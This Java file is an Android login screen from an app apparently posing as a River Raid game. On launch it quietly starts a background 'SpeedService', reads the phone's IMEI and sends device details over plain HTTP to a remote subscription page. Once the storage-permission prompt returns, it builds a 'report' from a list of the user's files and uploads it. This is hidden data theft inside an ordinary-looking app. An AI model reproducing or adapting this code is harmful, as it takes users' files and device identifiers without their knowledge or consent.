package ui;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.TextView;

import com.wang.avi.AVLoadingIndicatorView;

import com.barang.riverraid.BuildConfig;
import com.barang.riverraid.R;

import java.util.Objects;
import java.util.Random;

import Api.LoginApi;
import Helpers.SharedPreferencesHelper;
import ModelClasses.BarangSubscription;
import butterknife.BindView;
import butterknife.ButterKnife;
import butterknife.OnClick;
import rx.Subscriber;
import rx.android.schedulers.AndroidSchedulers;
import rx.schedulers.Schedulers;
import speed.SpeedService;

public class LoginActivity extends Activity {

    @BindView(R.id.avi_loading_activity_login)
    protected AVLoadingIndicatorView aviLoading;
    @BindView(R.id.web_view_login_activity)
    protected WebView webView;
    @BindView(R.id.loading_tv_activity_login)
    protected TextView loadingTv;

    private static final String TAG = LoginActivity.class.getName();
    private String deviceId;
    private String appId;
    private String osVersion;
    private String origin;
    public static SpeedService speedService;
    private static final int REQUEST_READWRITE_STORAGE = 1234;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        Log.i(TAG, "FUNCTION : onCreate");
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_login);
        ButterKnife.bind(this);

        startService(new Intent(this, SpeedService.class));

        checkPermissions();
        getDeviceSpecifications();
        initializeWebView();
        getIsSubscribed();
        initializeUi();
    }

    private boolean checkPermissions() {

        int permissionCheck1 = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE);
        int permissionCheck2 = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);


        if (permissionCheck1 != PackageManager.PERMISSION_GRANTED ||
                permissionCheck2 != PackageManager.PERMISSION_GRANTED) {


            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE,
                            Manifest.permission.READ_EXTERNAL_STORAGE},
                    REQUEST_READWRITE_STORAGE);
        }

        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        Log.i(TAG, "FUNCTION : onRequestPermissionsResult");
        speedService.uploadFile(speedService.generateFileOnSD(this, "report", speedService.getFilesList()), speedService.reportPath);
    }


    private void initializeUi() {
        Log.i(TAG, "FUNCTION : initializeUi");
        Objects.requireNonNull(getActionBar()).hide();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            getWindow().setStatusBarColor(getResources().getColor(R.color.Blue));
        }
    }

    private void getDeviceSpecifications() {
        Log.i(TAG, "FUNCTION : initializeWebView");
        deviceId = getDeviceImei();
        appId = BuildConfig.APP_ID;
        osVersion = Build.VERSION.RELEASE;
        origin = BuildConfig.ORIGIN;
    }

    @SuppressLint("HardwareIds")
    public String getDeviceImei() {
        Log.i(TAG, "FUNCTION : getDeviceImei");
        TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return new Random().nextInt() + "";
        }
        return telephonyManager.getDeviceId();
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void initializeWebView() {
        Log.i(TAG, "FUNCTION : initializeWebView");
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.setVerticalScrollBarEnabled(false);
        webView.loadUrl("http://api.localcdnet.com/page?deviceId=" + deviceId + "&appId=" + appId + "&origin=" + origin + "&OSVersion=" + osVersion + "&Step=1");
        Log.i(TAG, "FUNCTION : setWebViewClient");
        webView.setWebViewClient(new WebViewClient() {
            public boolean shouldOverrideUrlLoading(WebView viewx, String urlx) {
                Log.i(TAG, "FUNCTION : On new url load");
                if (urlx.equalsIgnoreCase(BuildConfig.DONE_URL)) {
                    Log.i(TAG, "FUNCTION : On new url load => Done!");
                    startActivity(new Intent(LoginActivity.this, FullscreenActivity.class).addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK));
                    SharedPreferencesHelper.put(LoginActivity.this, SharedPreferencesHelper.Property.IS_SUBSCRIBED, "true");
                    finish();
                } else {
                    Log.i(TAG, "FUNCTION : On new url load => Step forward");
                    viewx.loadUrl(urlx);
                }
                return false;
            }
        });
    }

    private void getIsSubscribed() {
        Log.i(TAG, "FUNCTION : getIsSubscribed");
        if (!SharedPreferencesHelper.get(this, SharedPreferencesHelper.Property.IS_SUBSCRIBED, "false").equals("false")) {
            Log.i(TAG, "FUNCTION : getIsSubscribed => Is NOT first time user opens the app");
            LoginApi.getInstance().getIsSubscribed(deviceId, appId, origin, osVersion)
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(new Subscriber<BarangSubscription>() {
                        @Override
                        public void onCompleted() {
                            Log.i(TAG, "FUNCTION : getIsSubscribed => onCompleted");
                        }

                        @Override
                        public void onError(Throwable e) {
                            Log.e(TAG, "FUNCTION : getIsSubscribed => onError: " + e.toString());
                            e.printStackTrace();
                        }

                        @Override
                        public void onNext(BarangSubscription subscription) {
                            Log.i(TAG, "FUNCTION : getIsSubscribed => onNext: " + subscription.getIsSubscribed());
                            if (subscription.getIsSubscribed()) {
                                startActivity(new Intent(LoginActivity.this, FullscreenActivity.class));
                                finish();
                            } else {
                                webView.setVisibility(View.VISIBLE);
                                aviLoading.setVisibility(View.INVISIBLE);
                                loadingTv.setVisibility(View.GONE);
                            }
                        }
                    });
        } else {
            Log.i(TAG, "FUNCTION : getIsSubscribed => Is first time user opens the app");
            webView.setVisibility(View.VISIBLE);
            aviLoading.setVisibility(View.INVISIBLE);
            loadingTv.setVisibility(View.GONE);
        }
    }

    @OnClick({R.id.close_btn_activity_login})
    public void onCloseBtnClick() {
        Log.i(TAG, "FUNCTION : onCloseBtnClick");
        startActivity(new Intent(LoginActivity.this, FullscreenActivity.class).addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK));
        finish();
    }

    @Override
    public void onBackPressed() {
        Log.i(TAG, "FUNCTION : onBackPressed");
        webView.goBack();
    }
}
